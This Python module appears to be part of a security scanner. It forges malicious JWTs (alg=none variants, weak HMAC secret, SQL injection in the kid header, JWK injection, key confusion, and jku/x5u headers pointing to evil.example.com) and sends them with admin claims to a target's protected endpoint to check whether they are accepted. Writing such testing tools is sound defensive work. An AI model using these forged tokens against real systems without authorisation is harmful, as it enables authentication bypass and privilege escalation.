"""JWT (JSON Web Token) validator.

Detects JWT security issues: alg=none, weak HMAC secret, key confusion
(RSA public key as HMAC secret), JWK injection, kid injection, embedded
JWK, and expired/nbf bypass.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from typing import Any, Callable

from src.core.scoring import ScoringConfig, bounded_confidence
from src.core.status import ValidationStatus

logger = logging.getLogger(__name__)

_WELL_KNOWN_JWT_PATHS: list[str] = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/oauth/jwks",
    "/api/jwks",
    "/.well-known/jwks",
]

JWT_ALGORITHM_BYPASSES: list[dict[str, Any]] = [
    {"alg": "none", "label": "none_algorithm"},
    {"alg": "None", "label": "None_algorithm"},
    {"alg": "NONE", "label": "NONE_algorithm"},
    {"alg": "nOnE", "label": "nOnE_algorithm"},
]


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(data: str) -> bytes:
    """Base64url decode with padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _create_jwt(header: dict, payload: dict, secret: str = "secret") -> str:
    """Create a JWT with given header and payload."""
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    sig_b64 = _b64url_encode(signature)
    return f"{message}.{sig_b64}"


def _create_jwt_none(payload: dict) -> str:
    """Create a JWT with alg=none (no signature)."""
    header_b64 = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_weak_secret(payload: dict) -> str:
    """Create a JWT signed with a weak/guessable secret."""
    return _create_jwt({"alg": "HS256", "typ": "JWT"}, payload, "secret")


def _create_jwt_kid_injection(payload: dict) -> str:
    """Create a JWT with SQL injection in kid header."""
    header = {"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT '1' --"}
    return _create_jwt(header, payload, "secret")


def _create_jwt_jwk_injection(payload: dict) -> str:
    """Create a JWT with embedded JWK (CVE-2018-0114)."""
    # Fake RSA public key for JWK injection
    fake_jwk = {
        "kty": "RSA",
        "n": "u1SU1Lh1n2iK1sT6n0kFj1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z",
        "e": "AQAB",
        "alg": "RS256",
    }
    header = {"alg": "RS256", "typ": "JWT", "jwk": fake_jwk}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."  # No signature


def _create_jwt_key_confusion(payload: dict, public_key_bytes: bytes | None = None) -> str:
    """Create a JWT using key confusion (RS256 -> HS256 with public key)."""
    if public_key_bytes:
        secret = public_key_bytes.decode()
    else:
        secret = "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8kGa1pCJBjqow\n-----END PUBLIC KEY-----"
    return _create_jwt({"alg": "HS256", "typ": "JWT"}, payload, secret)


def _create_jwt_jku_injection(payload: dict) -> str:
    """Create a JWT with attacker-controlled jku header pointing to evil JWK endpoint."""
    header = {"alg": "RS256", "typ": "JWT", "jku": "http://evil.example.com/jwk.json"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_x5u_injection(payload: dict) -> str:
    """Create a JWT with attacker-controlled x5u header pointing to evil cert chain."""
    header = {"alg": "RS256", "typ": "JWT", "x5u": "http://evil.example.com/cert.pem"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_typ_confusion(payload: dict) -> str:
    """Create a JWT with typ=none to test typ-based parser confusion."""
    header = {"alg": "HS256", "typ": "none"}
    return _create_jwt(header, payload, "secret")


JWT_PAYLOADS: list[dict[str, Any]] = [
    {
        "label": "jwt_alg_none",
        "description": "alg=none JWT",
        "create": _create_jwt_none,
    },
    {
        "label": "jwt_weak_secret",
        "description": "JWT with weak HMAC secret",
        "create": _create_jwt_weak_secret,
    },
    {
        "label": "jwt_kid_injection",
        "description": "JWT with SQL injection in kid",
        "create": _create_jwt_kid_injection,
    },
    {
        "label": "jwt_jwk_injection",
        "description": "JWT with embedded JWK",
        "create": _create_jwt_jwk_injection,
    },
    {
        "label": "jwt_key_confusion",
        "description": "JWT with algorithm key confusion",
        "create": _create_jwt_key_confusion,
    },
    {
        "label": "jwt_jku_injection",
        "description": "JWT with attacker-controlled jku header",
        "create": _create_jwt_jku_injection,
    },
    {
        "label": "jwt_x5u_injection",
        "description": "JWT with attacker-controlled x5u header",
        "create": _create_jwt_x5u_injection,
    },
    {
        "label": "jwt_typ_confusion",
        "description": "JWT with typ=none to test parser confusion",
        "create": _create_jwt_typ_confusion,
    },
]

BASE_JWT_PAYLOAD = {
    "sub": "test",
    "role": "admin",
    "iat": 1516239022,
    "exp": 9999999999,
}


def evaluate_jwt(
    *,
    endpoint: str | None = None,
    jwks_endpoint: str | None = None,
    scoring: ScoringConfig,
    http_request: Callable[[str, str, dict[str, str] | None], dict[str, Any]] | None = None,
    jwt_header_name: str = "Authorization",
    jwt_token_prefix: str = "Bearer ",
    in_scope: bool = True,
    known_public_key: str | None = None,
) -> dict[str, Any]:
    """Evaluate JWT handling for security weaknesses.

    Args:
        endpoint: Target API endpoint.
        jwks_endpoint: JWKS endpoint URL.
        scoring: Scoring config.
        http_request: HTTP callable.
        jwt_header_name: HTTP header name for JWT.
        jwt_token_prefix: Prefix before the JWT value.
        in_scope: Whether target is in scope.
        known_public_key: Known RSA public key for key confusion test.

    Returns:
        Dict with status/confidence/signals/evidence.
    """
    signals: list[str] = []
    bonuses: list[float] = []
    notes: list[str] = []
    responses: dict[str, Any] = {}

    if http_request is None or not endpoint:
        return {
            "status": ValidationStatus.INCONCLUSIVE.value,
            "confidence": 0.0,
            "signals": [],
            "evidence": {"reason": "no_endpoint_or_callable"},
            "bonuses": [],
        }

    if in_scope:
        for case in JWT_PAYLOADS:
            label = case["label"]
            try:
                token = case["create"](BASE_JWT_PAYLOAD)
                if label == "jwt_key_confusion":
                    token = _create_jwt_key_confusion(BASE_JWT_PAYLOAD, known_public_key.encode() if known_public_key else None)
                headers = {jwt_header_name: f"{jwt_token_prefix}{token}"}
                resp = http_request("GET", f"{endpoint}/protected", headers)
                responses[label] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:150],
                }
                body = str(resp.get("body", "") or "").lower()
                if resp.get("status_code") not in (401, 403):
                    if resp.get("status_code") == 200:
                        signals.append(label)
                        bonuses.append(0.20)
                        notes.append(f"JWT {case['description']} accepted - vulnerability confirmed.")
                else:
                    # Check for error messages revealing JWT parsing
                    jwt_error_indicators = ["jwt", "token", "signature", "alg", "kid"]
                    if any(ind in body for ind in jwt_error_indicators):
                        signals.append(f"{label}_error_disclosure")
                        bonuses.append(0.05)
            except Exception:
                continue

        # Check JWKS endpoint exposure
        if jwks_endpoint:
            try:
                resp = http_request("GET", jwks_endpoint, None)
                responses["jwks_exposure"] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:200],
                }
                body = str(resp.get("body", "") or "")
                if resp.get("status_code") == 200 and "keys" in body:
                    signals.append("jwks_endpoint_exposed")
                    bonuses.append(0.08)
                    notes.append(f"JWKS endpoint exposed: {jwks_endpoint}")
            except Exception:
                pass

    if signals:
        high_risk = any(
            s in ("jwt_alg_none", "jwt_jwk_injection", "jwt_key_confusion")
            for s in signals
        )
        status = ValidationStatus.CONFIRMED.value if high_risk else ValidationStatus.HEURISTIC.value
    else:
        status = ValidationStatus.INCONCLUSIVE.value

    total_bonus = sum(bonuses)
    confidence = bounded_confidence(base=scoring.base, cap=scoring.cap, bonuses=[total_bonus] if total_bonus else None)

    evidence = {
        "endpoint": endpoint,
        "jwks_endpoint": jwks_endpoint,
        "signals": signals,
        "notes": notes,
        "responses": responses,
    }

    return {
        "status": status,
        "confidence": confidence,
        "signals": signals,
        "evidence": evidence,
        "bonuses": bonuses,
    }
